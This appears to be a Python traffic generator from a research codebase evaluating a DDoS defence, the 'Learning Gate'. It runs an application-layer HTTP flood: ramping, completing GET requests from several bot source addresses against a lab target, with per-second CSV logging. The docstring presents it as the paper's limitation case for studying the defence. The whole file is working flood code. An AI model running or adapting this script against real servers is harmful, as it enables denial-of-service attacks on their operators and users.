#!/usr/bin/env python3
"""A "completing" attacker: real addresses, full HTTP requests, ramping rate.

    python3 -m egl.http_flood --dst 10.0.0.10 --mode ramp --base 6 --growth 0.02 \
        --cap 10 --duration 136 --sources 10.0.0.230,10.0.0.231 --log attack.csv

This is the honest limitation case for the paper. Every request is a real TCP
connection from a real (non-spoofed) bot address that finishes normally, so
the server sends a FIN for each one and the completion ratio stays near 1.
The Learning Gate therefore cannot tell these bots from a flash crowd: this
is an application-layer flood, which needs application-layer defences. The
same follows for the verified-client bypass: bots that complete connections
get verified.

Rate schedule: identical to syn_sender.py (egl/attack.py), but counting
connections per second instead of SYN packets.
"""

import argparse
import csv
import os
import random
import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor

from egl.attack import MODES, Pacer, attack_rate


def one_request(dst, port, src):
    try:
        with socket.create_connection((dst, port), timeout=3,
                                      source_address=(src, 0) if src else None) as s:
            s.sendall(b"GET / HTTP/1.0\r\nHost: victim\r\n\r\n")
            while s.recv(4096):
                pass
        return True
    except OSError:
        return False


def main():
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--dst", required=True)
    ap.add_argument("--dport", type=int, default=80)
    ap.add_argument("--mode", choices=MODES, default="ramp")
    ap.add_argument("--base", type=float, required=True)
    ap.add_argument("--growth", type=float, default=0.02)
    ap.add_argument("--cap", type=float, default=10.0)
    ap.add_argument("--duration", type=float, required=True)
    ap.add_argument("--sources", default="", help="comma-separated bot addresses")
    ap.add_argument("--log", required=True)
    ap.add_argument("--seed", type=int, default=1)
    args = ap.parse_args()

    rng = random.Random(args.seed)
    sources = [s for s in args.sources.split(",") if s] or [None]
    pacer = Pacer(lambda t: attack_rate(args.mode, t, args.base, args.growth, args.cap))
    lock = threading.Lock()
    done = {"ok": 0, "fail": 0}

    def task(src):
        ok = one_request(args.dst, args.dport, src)
        with lock:
            done["ok" if ok else "fail"] += 1

    os.makedirs(os.path.dirname(os.path.abspath(args.log)), exist_ok=True)
    with open(args.log, "w", newline="") as fh, ThreadPoolExecutor(max_workers=128) as pool:
        log = csv.writer(fh)
        log.writerow(["wall_time", "t", "planned_rate", "sent", "completed_total", "failed_total"])
        t0, wall0 = time.monotonic(), time.time()
        second, started = 0, 0
        while True:
            t = time.monotonic() - t0
            if t >= args.duration:
                break
            for _ in range(pacer.due(t)):
                pool.submit(task, rng.choice(sources))
                started += 1
            if int(t) > second:
                with lock:
                    ok, fail = done["ok"], done["fail"]
                log.writerow(["%.3f" % (wall0 + second + 1), second + 1,
                              "%.2f" % attack_rate(args.mode, second + 0.5, args.base,
                                                   args.growth, args.cap),
                              started, ok, fail])
                fh.flush()
                second, started = int(t), 0
            time.sleep(0.002)


if __name__ == "__main__":
    main()
